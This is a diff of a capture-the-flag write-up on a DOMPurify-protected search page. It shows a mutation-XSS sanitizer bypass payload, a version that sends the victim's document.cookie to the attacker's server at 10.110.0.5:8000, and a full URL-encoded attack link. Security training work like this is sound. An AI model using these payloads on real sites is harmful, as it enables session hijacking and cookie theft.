@@ -14,7 +14,7 @@ After exploring a little bit we can also find the contact button that leads to _
 
 ![Contact](./images/contact.png)
 
-Also in the source code we can __DOMpurify.min.js__ file. For now just taking notes.
+Also in the source code we can see __DOMpurify.min.js__ file. For now just taking notes.
 
 So if we can submit a url to someone that will read it, the first thing that comes to mind is vulnerable xss page with attacker's payload, so let's try it with search functionality.
 
@@ -22,7 +22,7 @@ So if we can submit a url to someone that will read it, the first thing that com
 
 ![Filtered](./images/filter.png)
 
-It got completely filtered out. And when we look at the source code we can se DOMpurify.sanitize in action.
+It got completely filtered out. And when we look at the source code we can se __DOMpurify.sanitize__ in action.
 
 The code responsible for that:
 
@@ -42,14 +42,13 @@ I tried several more payloads to see how it behaves but only several html inject
 
 I use firefox so i decided to try the first payload.
 
-```
+```javascript
 <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
 ```
 
 Now that we have XSS let's modify the payload to steal the cookie of whoever reads our url after the sumbition on the contact page.
 
-```
-
+```javascript
 <form><math><mtext></form><form><mglyph><style></math><img src onerror=window.location.href='http://10.110.0.5:8000?cookie='+document.cookie>
 ```
 
@@ -62,7 +61,7 @@ Where 10.110.0.3:8000 - our server. I used php, but you could use anything else 
 
 And we try to submit the following url that is automatically url encoded after we use the search functionality
 
-```
+```javascript
 https://purr-purr.ua30ctf.org/search.php?searchinput=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg+src+onerror%3Dwindow.location.href%3D%27http%3A%2F%2F10.110.0.5%3A8000%3Fcookie%3D%27%2Bdocument.cookie%3E
 ```
 
